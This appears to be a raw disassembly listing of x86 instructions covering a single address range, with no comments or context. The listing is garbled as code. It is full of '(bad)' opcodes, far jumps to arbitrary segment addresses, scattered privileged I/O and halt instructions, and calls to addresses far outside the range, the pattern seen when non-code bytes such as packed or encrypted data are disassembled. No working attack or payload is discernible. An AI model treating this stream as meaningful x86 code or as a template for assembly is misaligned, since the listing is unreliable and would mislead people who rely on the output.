  4294af:	sar    BYTE PTR [edx-0x25020a11],cl
  4294b5:	mov    edi,0xbee5f4ff
  4294ba:	push   es
  4294bb:	fucomp st(1)
  4294bd:	clc    
  4294be:	fcomp  st(4)
  4294c0:	or     al,0xc9
  4294c2:	jmp    0xdcf2:0xf6c4c3e0
  4294c9:	repz jmp 0x4294a3
  4294cc:	mov    cl,0xbb
  4294ce:	hlt    
  4294cf:	(bad)  
  4294d0:	test   bl,0xbe
  4294d3:	repz mov bh,0xb9
  4294d6:	(bad)  
  4294d8:	mov    ebx,0xc0f7d2c2
  4294dd:	aad    0xf7
  4294df:	hlt    
  4294e0:	loop   0x4294be
  4294e2:	add    edi,edi
  4294e4:	mov    cl,0xb1
  4294e6:	(bad)  
  4294e7:	ret    0xeacb
  4294ea:	in     al,dx
  4294eb:	(bad)  
  4294ec:	xlat   BYTE PTR ds:[ebx]
  4294ed:	fcom   st(3)
  4294ef:	mov    al,0xf5
  4294f1:	fcmovnbe st,st(4)
  4294f3:	jmp    0xb4f88ce8
  4294f8:	mov    BYTE PTR [esi],0xc6
  4294fb:	shl    eax,1
  4294fd:	or     esi,esp
  4294ff:	out    0xe,eax
  429501:	or     eax,0xbfb2c8d8
  429506:	(bad)
  429509:	loop   0x429506
  42950b:	mov    ch,0xfa
  42950d:	out    0xf9,al
  42950f:	mov    edx,0xd9b1cbce
  429514:	(bad)  
  429516:	mov    ebp,0xe7c2bff2
  42951b:	stc    
  42951c:	retf   0xf8fa
  42951f:	or     eax,0xe70306fb
  429524:	out    dx,eax
  429525:	ror    ah,cl
  429527:	leave  
  429528:	ret    
  429529:	retf   0xbbf1
  42952c:	out    dx,eax
  42952d:	retf   
  42952e:	in     al,0xda
  429530:	(bad)  
  429531:	retf   
  429532:	retf   0xeedc
  429535:	(bad)  
  429537:	rol    cl,1
  429539:	add    ebx,ecx
  42953b:	hlt    
  42953c:	or     ecx,ebp
  42953e:	(bad)  
  42953f:	(bad)  
  429541:	fcmove st,st(2)
  429543:	(bad)  
  429544:	out    0xe6,eax
  429546:	rcl    ebx,cl
  429548:	out    dx,al
  429549:	loopne 0x42950b
  42954b:	icebp  
  42954c:	mov    ebx,0xeeb8d0e7
  429551:	add    ecx,ecx
  429553:	call   0xd1256a26
  429558:	(bad)  
  42955a:	fucomp st(1)
  42955c:	add    esi,ebp
  42955e:	loopne 0x429559
  429560:	enter  0x30e,0xde
  429564:	fsubr  st,st(4)
  429566:	mov    edi,0xecc5d5e1
  42956b:	lock hlt 
  42956d:	out    dx,eax
  42956e:	lock aam 0xdf
  429571:	call   0xbf468973
  429576:	fdivr  st,st(4)
  429578:	fcmovb st,st(2)
  42957a:	test   DWORD PTR [eax],0xe4e508dc
  429580:	out    0xf9,eax
  429582:	out    0xcf,eax
  429584:	mov    bl,0xca
  429586:	repz (bad) 
  429588:	mov    bh,0xce
  42958a:	shr    DWORD PTR [eax+edi*8-0x4709260c],0xf5
  429592:	ret    
  429593:	add    DWORD PTR [ecx],eax
  429595:	add    ebx,eax
  429597:	out    0xd2,al
  429599:	ror    BYTE PTR [ebx],1
  42959b:	rol    bl,cl
  42959d:	retf   0xf8c0
  4295a0:	(bad)  
  4295a1:	hlt    
  4295a2:	repnz add eax,0xe9e3c5c8
  4295a8:	loop   0x4295a0
  4295aa:	mov    ch,0xe6
  4295ac:	mov    ah,0xb1
  4295ae:	mov    dh,0xf4
  4295b0:	jmp    0x429587
  4295b2:	stc    
  4295b3:	mov    esp,0xe101dce0
  4295b8:	shl    bl,cl
  4295ba:	mov    ecx,0xf9e8c0fa
  4295bf:	jmp    0xcaaf:0xe1f213ce
  4295c6:	retf   0xefae
  4295c9:	out    dx,al
  4295ca:	out    dx,al
  4295cb:	out    dx,eax
  4295cc:	in     al,dx
  4295cd:	test   cl,0xf4
  4295d0:	cld    
  4295d1:	in     eax,dx
  4295d2:	ret    
  4295d3:	in     eax,dx
  4295d4:	(bad)  
  4295d5:	in     al,dx
  4295d6:	repnz loope 0x4295ca
  4295d9:	in     al,dx
  4295da:	clc    
  4295db:	add    eax,DWORD PTR [ebx]
  4295dd:	(bad)
  4295e0:	leave  
  4295e1:	add    eax,0xcbdee808
  4295e6:	out    dx,eax
  4295e7:	fidiv  WORD PTR [ebp-0x2b172c2c]
  4295ed:	mov    ebx,0xf2beece4
  4295f2:	div    BYTE PTR [eax-0xd1c122a]
  4295f8:	std    
  4295f9:	cld    
  4295fa:	cli    
  4295fb:	loope  0x429601
  4295fd:	in     eax,0xdf
  4295ff:	aam    0xfc
  429601:	ret    0xe5fd
  429604:	ror    ebx,0xae
  429607:	int    0xd7
  429609:	ret    
  42960a:	jmp    0x4295e7
  42960c:	fxch   st(4)
  42960e:	(bad)  
  42960f:	std    
  429610:	rcr    edi,1
  429612:	(bad)  
  429613:	in     eax,dx
  429614:	add    edi,edx
  429616:	stc    
  429617:	add    bl,cl
  429619:	aam    0xc1
  42961b:	jecxz  0x429628
  42961d:	add    al,0xc5
  42961f:	fld    QWORD PTR [eax]
  429621:	retf   0xe6e4
  429624:	in     eax,0xde
  429626:	mov    bl,0xd0
  429628:	fnsave [ebp-0x9440615]
  42962e:	mov    edi,0xbcbbecb5
  429633:	fdivr  QWORD PTR [ebp-0x1382b2b]
  429639:	fucom  st(1)
  42963b:	in     eax,0xe9
  42963d:	out    0xf5,al
  42963f:	pop    es
  429640:	aad    0xfb
  429642:	repz fxch st(2)
  429645:	ror    cl,0xec
  429648:	fucomp st(7)
  42964a:	aad    0xf6
  42964c:	leave  
  42964d:	(bad)  
  42964e:	in     al,dx
  42964f:	jmp    0xdffc:0xd6b1d9fb
  429656:	pop    es
  429657:	xabort 0xfa
  42965a:	(bad)  
  42965c:	or     dh,al
  42965e:	in     al,0xdf
  429660:	leave  
  429661:	or     al,0xa
  429663:	(bad)  
  429664:	out    0xf0,al
  429666:	mov    edi,0xe2c2f0cd
  42966b:	test   al,0xf6
  42966d:	in     al,dx
  42966e:	int3   
  42966f:	clc    
  429670:	enter  0xe3fe,0x1
  429674:	call   0xed439051
  429679:	fstp   st(6)
  42967b:	fxtract 
  42967d:	fstp   st(5)
  42967f:	clc    
  429680:	or     ebp,edi
  429682:	out    0xe,al
  429684:	out    0xe4,al
  429686:	ret    0xcff1
  429689:	(bad)  
  42968a:	int    0xcf
  42968c:	aam    0xb8
  42968e:	aad    0xd6
  429690:	enter  0xb4b6,0xef
  429694:	aam    0x2
  429696:	fcmovu st,st(5)
  429698:	in     al,dx
  429699:	add    bh,al
  42969b:	add    DWORD PTR ds:0xdffbc1f4,eax
  4296a1:	add    ah,al
  4296a3:	or     al,0xea
  4296a5:	out    0xa8,al
  4296a7:	les    esi,FWORD PTR [ebx-0x4f2e2449]
  4296ad:	(bad)  
  4296ae:	retf   0xd8ee
  4296b1:	mov    esi,0xbfd6ece3
  4296b6:	in     eax,dx
  4296b7:	aad    0xbd
  4296b9:	fsubrp st(2),st
  4296bb:	pop    es
  4296bc:	ror    BYTE PTR [edi],0xd9
  4296bf:	ffree  st(7)
  4296c1:	fsubr  st,st(1)
  4296c3:	fidivr DWORD PTR [esi-0x2a39213a]
  4296c9:	retf   0xbacb
  4296cc:	mov    edx,0xbad5b6da
  4296d1:	shl    dh,1
  4296d3:	repz add eax,DWORD PTR [edi]
  4296d6:	(bad)  
  4296d7:	icebp  
  4296d8:	cld    
  4296d9:	fcomp  st(2)
  4296db:	add    eax,0xd8c703c3
  4296e0:	(bad)  
  4296e1:	int    0xea
  4296e3:	leave  
  4296e4:	mov    edi,0xccc0b0c7
  4296e9:	mov    al,0xfb
  4296eb:	mov    cl,0xf7
  4296ed:	mov    bh,0xec
  4296ef:	out    0xcd,al
  4296f1:	clc    
  4296f2:	sti    
  4296f3:	into   
  4296f4:	int    0x1
  4296f6:	push   es
  4296f7:	loope  0x4296f9
  4296f9:	les    eax,FWORD PTR ds:0xfafed7c4
  4296ff:	add    ecx,edx
  429701:	in     al,dx
  429702:	out    0xca,al
  429704:	mov    ecx,0xc5dceacd
  42970a:	shr    esp,0xeb
  42970d:	repnz dec ecx
  429710:	aam    0xb6
  429712:	hlt    
  429713:	aad    0xb9
  429715:	repz hlt 
  429717:	loop   0x429715
  429719:	add    esp,esi
  42971b:	xlat   BYTE PTR ds:[ebx]
  42971c:	sar    ch,1
  42971e:	fmul   QWORD PTR [edx]
  429720:	leave  
  429721:	add    ebx,edi
  429723:	into   
  429724:	mov    edi,0xcbe5bce3
  429729:	(bad)  
  42972a:	not    cl
  42972c:	imul   ecx
  42972e:	ror    esp,1
  429730:	frndint 
  429732:	add    edi,ebx
  429734:	fstp   st(1)
  429736:	mov    eax,0x2e0dbc6
  42973b:	rol    bh,1
  42973d:	(bad)  
  42973e:	jmp    0x429704
  429740:	(bad)  
  429742:	add    al,0xcc
  429744:	ror    edi,cl
  429746:	scas   al,BYTE PTR es:[edi]
  429747:	shl    DWORD PTR [edi-0x1e1b2810],1
  42974d:	cli    
  42974e:	int    0xd0
  429750:	fbstp  TBYTE PTR [ebp-0x412f2f04]
  429756:	rol    dh,cl
  429758:	cli    
  429759:	fsub   st(3),st
  42975b:	out    0xe3,eax
  42975d:	cld    
  42975e:	or     eax,esp
  429760:	iret   
  429761:	iret   
  429762:	(bad)  
  429763:	into   
  429764:	rep lods eax,DWORD PTR ds:[esi]
  429766:	xlat   BYTE PTR ds:[ebx]
  429767:	(bad)
  42976a:	lods   al,BYTE PTR ds:[esi]
  42976b:	cmc    
  42976c:	jmp    0xeddd:0xd2d8cfc0
  429773:	icebp  
  429774:	leave  
  429775:	rol    edi,1
  429777:	clc    
  429778:	(bad)  
  429779:	loop   0x42975a
  42977b:	pop    es
  42977c:	hlt    
  42977d:	hlt    
  42977e:	jecxz  0x429759
  429780:	(bad)
  429783:	repnz stos BYTE PTR es:[edi],al
  429785:	stos   BYTE PTR es:[edi],al
  429786:	scas   al,BYTE PTR es:[edi]
  429787:	retf   
  429788:	loop   0x42977e
  42978a:	mov    edi,0xccd3bbfa
  429790:	xlat   BYTE PTR ds:[ebx]
  429791:	jmp    0x429781
  429793:	aad    0xd5
  429795:	aad    0xbf
  429797:	clc    
  429798:	idiv   dh
  42979a:	jecxz  0x429783
  42979c:	or     BYTE PTR [edx],al
  42979e:	add    ebp,edi
  4297a0:	in     al,0x5
  4297a2:	add    ecx,esp
  4297a4:	mov    ecx,0xe5b7bee7
  4297a9:	mov    ch,0xcf
  4297ab:	sti    
  4297ac:	stc    
  4297ad:	mov    al,0xf1
  4297af:	hlt    
  4297b0:	xlat   BYTE PTR ds:[ebx]
  4297b1:	fsub   st,st(2)
  4297b3:	iret   
  4297b4:	imul   dh
  4297b6:	shr    ebp,cl
  4297b8:	neg    ebp
  4297ba:	loopne 0x4297c2
  4297bc:	call   0xe323778c
  4297c1:	jmp    0xd833a6cc
  4297c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4297c7:	(bad)
  4297ca:	aam    0xf0
  4297cc:	mov    ebx,0xf1bbb8cc
  4297d1:	xlat   BYTE PTR ds:[ebx]
  4297d2:	mov    edx,0x3e0d1de
  4297d7:	mov    ah,0xd9
  4297d9:	hlt    
  4297da:	in     al,0xc7
  4297dc:	call   0xf5228ec4
  4297e1:	(bad)  
  4297e2:	call   0xe8365ab2
  4297e7:	mov    cl,0xce
  4297e9:	(bad)  
  4297ea:	int3   
  4297eb:	mov    ebx,0xd2d6dff1
  4297f0:	mov    dh,0xde
  4297f2:	mov    ch,0xf2
  4297f4:	clc    
  4297f5:	pop    es
  4297f6:	fsqrt  
  4297f8:	(bad)  
  4297fa:	cld    
  4297fb:	jmp    esp
  4297fd:	out    dx,eax
  4297fe:	jecxz  0x4297e3
  429800:	fisttp WORD PTR ds:0xefe2f905
  429806:	rol    edi,0xe4
  429809:	mov    dl,0xf5
  42980b:	(bad)  
  42980c:	repnz int3 
  42980e:	leave  
  42980f:	leave  
  429810:	out    dx,eax
  429811:	retf   
  429812:	inc    DWORD PTR [edx]
  429814:	cmc    
  429815:	icebp  
  429816:	fcmovnu st,st(5)
  429818:	(bad)
  42981b:	hlt    
  42981c:	or     edx,ebp
  42981e:	inc    dh
  429820:	(bad)  
  429822:	retf   0xb3e3
  429825:	ror    eax,0xd5
  429828:	not    eax
  42982a:	shl    DWORD PTR [ecx-0x2f062519],0xbe
  429831:	jecxz  0x4297ef
  429833:	icebp  
  429834:	std    
  429835:	sar    edx,0xe5
  429838:	in     eax,0xd9
  42983a:	idiv   dh
  42983c:	ret    
  42983d:	aam    0xe6
  42983f:	fdivrp st(4),st
  429841:	(bad)  
  429842:	retf   
  429843:	int3   
  429844:	fmul   st,st(3)
  429846:	test   eax,0xe6d2cfd5
  42984b:	(bad)  
  42984c:	in     eax,dx
  42984d:	in     al,dx
  42984e:	call   0xee166121
  429853:	ror    bh,cl
  429855:	clc    
  429856:	int    0xf5
  429858:	sar    ah,0xe5
  42985b:	rol    dl,0x4
  42985e:	(bad)  
  429860:	(bad)  
  429862:	into   
  429863:	bnd ret 0xe2d0
  429867:	jmp    0xd7278539
  42986c:	hlt    
  42986d:	xlat   BYTE PTR ds:[ebx]
  42986e:	(bad)  
  42986f:	xlat   BYTE PTR ds:[ebx]
  429870:	(bad)  
  429871:	cld    
  429872:	int3   
  429873:	(bad)  
  429875:	(bad)  
  429876:	out    dx,al
  429877:	loope  0x429874
  429879:	aad    0xfd
  42987b:	lock add al,0xda
  42987e:	std    
  42987f:	call   0xfd077182
  429884:	(bad)  
  429886:	(bad)  
  429887:	mov    dh,0xf2
  429889:	in     eax,0xd0
  42988b:	hlt    
  42988c:	scas   eax,DWORD PTR es:[edi]
  42988d:	clc    
  42988e:	mov    ah,0xb7
  429890:	std    
  429891:	retf   
  429892:	iret   
  429893:	std    
  429894:	ret    0xb5f1
  429897:	in     eax,dx
  429898:	cmc    
  429899:	int3   
  42989a:	loop   0x42989e
  42989c:	(bad)  
  42989d:	jecxz  0x42987c
  42989f:	iret   
  4298a0:	add    cl,dl
  4298a2:	retf   0xd9d3
  4298a5:	fmul   st,st(1)
  4298a7:	shl    ch,0xd2
  4298aa:	repz sti 
  4298ac:	mov    dh,0xc8
  4298ae:	in     eax,0xc4
  4298b0:	fcmovu st,st(1)
  4298b2:	int3   
  4298b3:	cld    
  4298b4:	in     al,dx
  4298b5:	loopne 0x4298b8
  4298b7:	(bad)  
  4298b9:	or     eax,edi
  4298bb:	les    ecx,FWORD PTR [eax]
  4298bd:	mov    esi,0xde0beef8
  4298c2:	add    BYTE PTR [ebx],dl
  4298c4:	mov    ebp,0xd1f3f3de
  4298c9:	(bad)  
  4298ca:	not    ch
  4298cc:	cmc    
  4298cd:	vpmaddwd ymm4,ymm6,ymm4
  4298d1:	mov    ch,0xba
  4298d3:	clc    
  4298d4:	xlat   BYTE PTR ds:[ebx]
  4298d5:	fucomp st(4)
  4298d7:	mov    eax,0xd6e2d5fd
  4298dc:	add    al,0xff
  4298de:	fucom  st(7)
  4298e0:	clc    
  4298e1:	fst    QWORD PTR [ebx]
  4298e3:	repz iret 
  4298e5:	ror    al,1
  4298e7:	lock mov bh,0xd2
  4298ea:	shl    edi,1
  4298ec:	loopne 0x42989e
  4298ee:	neg    esi
  4298f0:	aam    0xbe
  4298f2:	sar    ah,cl
  4298f4:	cmc    
  4298f5:	mov    esi,0xf4d7ccff
  4298fa:	in     al,0xdb
  4298fc:	inc    al
  4298fe:	(bad)  
  429900:	cld    
  429901:	std    
  429902:	or     bh,cl
  429904:	int    0xbf
  429906:	int3   
  429907:	mov    ebp,0xe2e3d1d4
  42990c:	cli    
  42990d:	clc    
  42990e:	repnz imul esi
  429911:	fdivr  st,st(6)
  429913:	(bad)  
  429914:	mov    ebx,0x4c0f5bf
  429919:	add    BYTE PTR [edx+ebx*8-0x2037f92b],bh
  429920:	in     al,dx
  429921:	or     DWORD PTR [edx],eax
  429923:	int    0xdd
  429925:	loop   0x4298d0
  429927:	mov    dh,0xd7
  429929:	lods   eax,DWORD PTR ds:[esi]
  42992a:	lock mov ch,0xb3
  42992d:	div    al
  42992f:	in     al,0xc5
  429931:	enter  0xb9eb,0xf0
  429935:	std    
  429936:	icebp  
  429937:	sti    
  429938:	sti    
  429939:	jmp    0x42992e
  42993b:	repnz cli 
  42993d:	jmp    0x2489a44
  429942:	loop   0x42992a
  429944:	shl    al,cl
  429946:	mov    ebp,0xcbb7ddcc
  42994b:	out    0xce,al
  42994d:	out    0xcc,al
  42994f:	mov    eax,0xffddeef6
  429954:	mov    edx,0xe7d4ecd1
  429959:	fnop   
  42995b:	in     al,0xcb
  42995d:	stc    
  42995e:	or     BYTE PTR [eax],al
  429960:	call   0xd247ac6d
  429965:	ret    
  429966:	shl    bl,1
  429968:	in     eax,0xb3
  42996a:	mov    dh,0xd1
  42996c:	int3   
  42996d:	fisubr DWORD PTR [ebp-0x2c273a]
  429973:	loop   0x429977
  429975:	xlat   BYTE PTR ds:[ebx]
  429976:	ret    
  429977:	aam    0xd6
  429979:	loopne 0x42996c
  42997b:	jmp    0x429940
  42997d:	mov    DWORD PTR ds:0xedf8eee4,0xe2e5c601
  429987:	repnz mul edx
  42998a:	retf   0xe4e0
  42998d:	enter  0xd8f9,0xd0
  429991:	mov    esp,0xe0e1fbd0
  429996:	icebp  
  429997:	add    bl,bl
  429999:	fadd   st,st(5)
  42999b:	clc    
  42999c:	hlt    
  42999d:	neg    eax
  42999f:	lds    eax,FWORD PTR [esi]
  4299a1:	push   es
  4299a2:	push   es
  4299a3:	out    0xee,al
  4299a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299a6:	lods   eax,DWORD PTR ds:[esi]
  4299a7:	out    0xd6,al
  4299a9:	aam    0xe8
  4299ab:	loop   0x429962
  4299ad:	out    dx,al
  4299ae:	leave  
  4299af:	div    DWORD PTR [ebp-0x2b202a2c]
  4299b5:	add    ebp,ecx
  4299b7:	inc    DWORD PTR [ecx+esi*8]
  4299ba:	jmp    0x42999c
  4299bc:	cmc    
  4299bd:	hlt    
  4299be:	loope  0x4299ab
  4299c0:	push   cs
  4299c1:	loop   0x4299c7
  4299c3:	pop    es
  4299c4:	rol    ch,cl
  4299c6:	mov    esp,0xc4f5c5d6
  4299cb:	mov    bl,0xc8
  4299cd:	shl    dh,cl
  4299cf:	mov    eax,0x2d4d2fc
  4299d4:	icebp  
  4299d5:	shr    esi,cl
  4299d7:	fsin   
  4299d9:	out    0x2,eax
  4299db:	std    
  4299dc:	add    al,0x3
  4299de:	fucomi st,st(3)
  4299e0:	push   es
  4299e1:	std    
  4299e2:	adc    edi,ecx
  4299e4:	(bad)  
  4299e6:	in     al,0xcf
  4299e8:	mov    ebp,0xb1cdc2e7
  4299ed:	iret   
  4299ee:	retf   0xd2c8
  4299f1:	icebp  
  4299f2:	loop   0x4299f0
  4299f4:	(bad)  
  4299f5:	mov    dh,0x3
  4299f7:	hlt    
  4299f8:	push   es
  4299f9:	repz pop es
  4299fb:	fcomi  st,st(5)
  4299fd:	loopne 0x4299da
  4299ff:	call   0x34d72e4
  429a04:	mov    bl,0xb8
  429a06:	mov    edi,0xf1b6cdcb
  429a0b:	not    edi
  429a0d:	repnz iret 
  429a0f:	retf   
  429a10:	mov    ebp,0xfed0c9be
  429a15:	(bad)  
  429a17:	fild   DWORD PTR [ecx]
  429a19:	mov    esp,0xf7e8fae2
  429a1e:	aad    0x4
  429a20:	jmp    0x429a01
  429a22:	fmulp  st(3),st
  429a24:	mov    esp,0xe6cee5d0
  429a29:	ret    
  429a2a:	out    dx,eax
  429a2b:	lods   al,BYTE PTR ds:[esi]
  429a2c:	rol    ebp,1
  429a2e:	mov    eax,0xd3cadec8
  429a33:	lock fdivr st,st(6)
  429a36:	int3   
  429a37:	rcr    esi,1
  429a39:	add    cl,bh
  429a3b:	rcl    eax,1
  429a3d:	out    dx,eax
  429a3e:	or     esi,edi
  429a40:	int    0xe4
  429a42:	add    eax,0xc6e2df0b
  429a47:	not    ebp
  429a49:	rol    ch,0xa8
  429a4c:	(bad)  
  429a4d:	loopne 0x429a05
  429a4f:	fnstsw WORD PTR [edx-0x73544]
  429a55:	mov    ecx,0xd8ecbce6
  429a5a:	xlat   BYTE PTR ds:[ebx]
  429a5b:	add    esi,esi
  429a5d:	(bad)  
  429a5f:	push   es
  429a60:	(bad)  
  429a61:	std    
  429a62:	bswap  ebx
  429a64:	(bad)  
  429a65:	mov    eax,0xb6cbafed
  429a6a:	ret    0xd8c2
  429a6d:	loopne 0x429a42
  429a6f:	in     al,dx
  429a70:	in     eax,0xb2
  429a72:	out    dx,eax
  429a73:	(bad)  
  429a74:	fidivr WORD PTR [ecx+0x7fff9ed]
  429a7a:	sti    
  429a7b:	ret    0x1fb
  429a7e:	ror    DWORD PTR [esi],0xdc
  429a81:	pop    es
  429a82:	or     ebx,esp
  429a84:	iret   
  429a85:	shl    ch,0xcf
  429a88:	mov    al,0xdc
  429a8a:	leave  
  429a8b:	aam    0xd9
  429a8d:	div    DWORD PTR [edi-0x31024905]
  429a93:	mov    edi,0x3cefdd5
  429a98:	in     eax,dx
  429a99:	vpsubd ymm5,ymm1,ymm1
  429a9d:	or     BYTE PTR [edx],cl
  429a9f:	aad    0xe3
  429aa1:	out    0xfe,eax
  429aa3:	jmp    0xcdcb:0xc9c6b2e7
  429aaa:	xlat   BYTE PTR ds:[ebx]
  429aab:	mov    ebx,0xb8dbceba
  429ab0:	(bad)  
  429ab2:	leave  
  429ab3:	add    ebx,edi
  429ab5:	std    
  429ab6:	fadd   st,st(0)
  429ab8:	ret    0xc5e0
  429abb:	repnz out 0xa,eax
  429abe:	xlat   BYTE PTR ds:[ebx]
  429abf:	leave  
  429ac0:	(bad)  
  429ac1:	jmp    0xe7ad:0xb0d2c9e1
  429ac8:	lock sar edx,0xd7
  429acc:	(bad)  [edi-0x32010632]
  429ad2:	repz out dx,al
  429ad4:	loopne 0x429ab3
  429ad6:	loope  0x429aad
  429ad8:	sar    BYTE PTR [edx+0x8ddde01],cl
  429ade:	xlat   BYTE PTR ds:[ebx]
  429adf:	add    edi,edi
  429ae1:	repz or eax,0xb2ceeaf2
  429ae7:	repnz in eax,dx
  429ae9:	leave  
  429aea:	int3   
  429aeb:	mov    dl,0xba
  429aed:	mov    dl,0xb7
  429aef:	rcl    eax,1
  429af1:	mov    esp,0xfaf7f5c3
  429af6:	iret   
  429af7:	jecxz  0x429ab5
  429af9:	cld    
  429afa:	fsubrp st(1),st
  429afc:	or     ah,ah
  429afe:	shr    ch,0xff
  429b01:	sti    
  429b02:	loopne 0x429b12
  429b04:	call   0xb1067ee9
  429b09:	mov    dl,0xd7
  429b0b:	out    dx,eax
  429b0c:	mov    dl,0xda
  429b0e:	out    0xb8,eax
  429b10:	in     eax,0xfe
  429b12:	retf   
  429b13:	sar    DWORD PTR [edx+ebx*8-0x4502f939],cl
  429b1a:	out    0xdb,al
  429b1c:	call   0xe5128522
  429b21:	push   cs
  429b22:	in     al,dx
  429b23:	jmp    0xae0e6112
  429b28:	scas   al,BYTE PTR es:[edi]
  429b29:	mov    ah,0xc6
  429b2b:	sar    ecx,0xef
  429b2e:	in     eax,dx
  429b2f:	(bad)  
  429b31:	repz clc 
  429b33:	mov    eax,0xf2e0fed2
  429b38:	add    ch,ah
  429b3a:	idiv   ecx
  429b3c:	retf   0x2d7
  429b3f:	enter  0xd4f8,0xe1
  429b43:	cli    
  429b44:	(bad)  
  429b46:	fnstsw ax
  429b48:	into   
  429b49:	int    0xd5
  429b4b:	shl    ebx,1
  429b4d:	(bad)
  429b50:	clc    
  429b51:	(bad)  
  429b53:	fcmovnbe st,st(7)
  429b55:	add    ah,bh
  429b57:	ret    0xccc5
  429b5a:	ffreep st(4)
  429b5c:	in     eax,0xd5
  429b5e:	invd   
  429b60:	add    ah,al
  429b62:	(bad)
  429b65:	in     eax,dx
  429b66:	ror    dl,1
  429b68:	rcr    bl,1
  429b6a:	out    dx,al
  429b6b:	repnz iret 
  429b6d:	repz push eax
  429b70:	fcomi  st,st(7)
  429b72:	int3   
  429b73:	hlt    
  429b74:	repnz rol DWORD PTR [eax],0xd0
  429b78:	mov    ebx,0xd8e10bdc
  429b7d:	in     al,0x4
  429b7f:	loopne 0x429b8a
  429b81:	stc    
  429b82:	or     eax,DWORD PTR [edi]
  429b84:	test   al,0xae
  429b86:	mov    esi,0xb2f6abed
  429b8b:	int    0xe1
  429b8d:	out    dx,eax
  429b8e:	cmc    
  429b8f:	ror    dl,cl
  429b91:	mov    ebp,0xf5cdcfbd
  429b96:	fdivr  st,st(6)
  429b98:	int    0x1
  429b9a:	ret    
  429b9b:	jmp    0x429ba1
  429b9d:	xlat   BYTE PTR ds:[ebx]
  429b9e:	aad    0xe5
  429ba0:	sti    
  429ba1:	add    esp,edi
  429ba3:	(bad)  
  429ba4:	iret   
  429ba5:	in     al,0xd7
  429ba7:	into   
  429ba8:	mov    ebp,0xccd5cfec
  429bad:	stc    
  429bae:	stc    
  429baf:	fnstenv [edi-0x1f2c332f]
  429bb5:	out    dx,al
  429bb6:	(bad)  
  429bb7:	fsubrp st(0),st
  429bb9:	sar    eax,1
  429bbb:	add    esp,edx
  429bbd:	enter  0xe8e5,0xee
  429bc1:	out    dx,eax
  429bc2:	pop    es
  429bc3:	or     esi,eax
  429bc5:	xlat   BYTE PTR ds:[ebx]
  429bc6:	mov    ebp,0xdbc4f0c1
  429bcc:	into   
  429bcd:	mov    ecx,0xf3b4d4da
  429bd2:	mov    edx,0xf4e3efd9
  429bd7:	in     eax,0xcc
  429bd9:	sti    
  429bda:	add    eax,ebp
  429bdc:	cli    
  429bdd:	fld    DWORD PTR [ebx]
  429bdf:	inc    BYTE PTR [ecx]
  429be1:	fcmove st,st(6)
  429be3:	or     cl,dh
  429be5:	retf   0xe7e2
  429be8:	jmp    0xce076bd3
  429bed:	icebp  
  429bee:	mov    edi,0xedd1bafa
  429bf3:	add    edi,DWORD PTR [ebp-0x2742070b]
  429bf9:	in     al,0xf5
  429bfb:	or     ecx,esp
  429bfd:	in     al,0xf8
  429bff:	ror    BYTE PTR [ebx],0xdb
  429c02:	lds    eax,FWORD PTR ds:0xd3ebf0c0
  429c08:	in     al,0xb2
  429c0a:	(bad)  
  429c0b:	shl    dh,cl
  429c0d:	clc    
  429c0e:	retf   
  429c0f:	mov    dh,0xff
  429c11:	icebp  
  429c12:	call   0xd41a95ed
  429c17:	fcomp  st(5)
  429c19:	lock test DWORD PTR [edx],0x4c6e1f4
  429c20:	leave  
  429c21:	enter  0x12d3,0xcc
  429c25:	jmp    0xc6c9:0xc6bcd3ae
  429c2c:	call   0xf20f4a16
  429c31:	mov    edi,0xd7d2edda
  429c36:	loop   0x429c2f
  429c38:	stc    
  429c39:	pop    es
  429c3a:	retf   
  429c3b:	fisttp WORD PTR [edx]
  429c3d:	lock in al,0xdc
  429c40:	fadd   st(5),st
  429c42:	or     eax,0xe3eeed04
  429c47:	call   0xe9367010
  429c4c:	shr    cl,cl
  429c4e:	leave  
  429c4f:	fsqrt  
  429c51:	(bad)  
  429c52:	in     eax,dx
  429c53:	call   0xc8317d4c
  429c58:	vpsrad ymm6,ymm4,xmm7
  429c5c:	jmp    0xe94d633d
  429c61:	iret   
  429c62:	add    BYTE PTR [edi],cl
  429c64:	mov    esi,0xb3ddaeec
  429c69:	int    0xed
  429c6b:	shl    bh,1
  429c6d:	hlt    
  429c6e:	mov    ebx,0xb4efddea
  429c73:	aad    0xfc
  429c75:	mov    ecx,0xdc03d7ee
  429c7a:	or     ecx,ebx
  429c7c:	fisttp DWORD PTR [edx]
  429c7e:	add    eax,DWORD PTR [ecx]
  429c80:	in     al,dx
  429c81:	or     bl,ch
  429c83:	jecxz  0x429c75
  429c85:	scas   eax,DWORD PTR es:[edi]
  429c86:	in     al,dx
  429c87:	jmp    0xfb26833e
  429c8c:	mov    ch,0xd1
  429c8e:	fsqrt  
  429c90:	sti    
  429c91:	(bad)  
  429c92:	stc    
  429c93:	aad    0xf0
  429c95:	mov    esp,0xc2f902e6
  429c9a:	mov    dh,0xdd
  429c9d:	add    BYTE PTR [ecx],al
  429c9f:	out    0xe3,al
  429ca1:	or     dh,ch
  429ca3:	loope  0x429c58
  429ca5:	jecxz  0x429c96
  429ca7:	(bad)  
  429ca8:	ror    al,1
  429caa:	cli    
  429cab:	mov    al,0xb0
  429cad:	jmp    0x429c87
  429caf:	mov    ch,0xdd
  429cb1:	repz (bad) 
  429cb3:	jmp    0xd8c6:0xfad4da01
  429cba:	mov    esp,0xd9dac9bc
  429cbf:	mov    esp,0xf9cfe4df
  429cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429cc5:	in     eax,0xc3
  429cc7:	out    dx,eax
  429cc8:	retf   
  429cc9:	(bad)  
  429cca:	loope  0x429c94
  429ccc:	mov    cl,0xdf
  429cce:	sti    
  429ccf:	sar    BYTE PTR [ebx-0x45092945],1
  429cd5:	test   bh,0xf4
  429cd8:	(bad)  
  429cd9:	rcl    bl,cl
  429cdb:	xlat   BYTE PTR ds:[ebx]
  429cdc:	jmp    0x13fc:0xd5ddebe7
  429ce3:	stc    
  429ce4:	(bad)  
  429ce5:	in     al,dx
  429ce6:	rol    ecx,1
  429ce8:	aam    0xcd
  429cea:	icebp  
  429ceb:	enter  0xe7d1,0xdf
  429cef:	fdivr  DWORD PTR [ecx-0x40170522]
  429cf5:	sar    eax,cl
  429cf7:	(bad)  
  429cf8:	fsqrt  
  429cfa:	fcomp  st(3)
  429cfc:	fisttp WORD PTR [ecx]
  429cfe:	add    ah,ah
  429d00:	add    cl,BYTE PTR [ecx]
  429d02:	pmulhuw mm7,QWORD PTR [ebx+ebp*8-0x31392840]
  429d0a:	(bad)  
  429d0b:	stc    
